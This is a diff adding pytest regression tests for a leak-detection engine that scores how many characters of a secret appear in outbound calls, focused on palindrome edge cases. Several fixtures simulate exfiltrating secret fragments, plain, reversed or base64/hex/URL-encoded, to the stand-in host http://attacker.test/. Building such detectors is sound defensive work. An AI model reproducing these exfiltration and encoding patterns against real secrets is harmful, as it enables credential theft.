@@ -246,3 +246,41 @@ def test_property_short_is_candidate_only(rnd, start, length):
     r = BitsEngine({"S": secret}).observe(call({"b": f"zz {secret[start:end]} zz"}))["S"]
     assert r["bits"] == 0
     assert set(range(start, end)) <= set(r["candidate_positions"])
+
+
+# --- #76: regresión de palíndromos ---------------------------------------------
+# Casos encontrados por test_property_K_is_true_K. El secreto tiene un palíndromo de 9 caracteres
+# pegado al borde del fragmento enviado. La variante invertida del fragmento contiene entonces
+# 8 caracteres del secreto desplazados una posición, fuera de lo enviado.
+
+PALINDROME_CASES = [
+    # (secreto, inicio, fin, codificación, relleno izq., relleno der.)
+    ("c07880cc896a3a84907d5d7095ca18294382a8f6", 0, 24, "b64", "SgLtkQ SNHkjtWzTGzKW", "mlXRGlQMVxjUnYS nxmt"),
+    ("4c12ad22b22dab55ec6003792aae61dc427f16d6", 5, 40, "upper", "ZIxSHzSyshJRrGKYLtsz", "hyUYyRZlpNhwqrUSgXop"),
+    ("61342f7178be1296258052e0086aca68020189cf", 25, 40, "url", "uVLNJlJUqKGQRVXJQMSG", "upzHOriNHMnlWtgvWqxw"),
+    ("7379ccca63ded36aec20cec0b7dc624a38257a7e", 6, 15, "hex", " TQVZ JyKKxyPGJNIUVP", "YXwmoLisVxnPxKqUGqSK"),
+]
+
+
+@pytest.mark.parametrize("secret,start,end,enc,f1,f2", PALINDROME_CASES)
+def test_palindrome_regression(secret, start, end, enc, f1, f2):
+    eng = BitsEngine({"S": secret})
+    body = f"{f1} {ENCODINGS[enc](secret[start:end])} {f2}"
+    r = eng.observe(call({"url": "http://attacker.test/", "body": body}))["S"]
+    assert set(r["positions"]) == set(range(start, end))
+
+
+@pytest.mark.parametrize("secret,start,end,enc,f1,f2", PALINDROME_CASES)
+def test_palindrome_regression_reversed_attack(secret, start, end, enc, f1, f2):
+    """Simétrico: el atacante envía el fragmento invertido; la variante directa no debe sumar posiciones."""
+    eng = BitsEngine({"S": secret})
+    body = f"{f1} {secret[start:end][::-1]} {f2}"
+    r = eng.observe(call({"url": "http://attacker.test/", "body": body}))["S"]
+    assert set(r["positions"]) == set(range(start, end))
+
+
+def test_palindrome_itself_is_counted():
+    """Si lo enviado es justo el palíndromo, sus posiciones sí cuentan."""
+    secret = "c07880cc896a3a84907d5d7095ca18294382a8f6"   # palíndromo en 16..24: 907d5d709
+    r = BitsEngine({"S": secret}).observe(call({"b": f"zz {secret[16:25]} zz"}))["S"]
+    assert r["positions"] == list(range(16, 25))
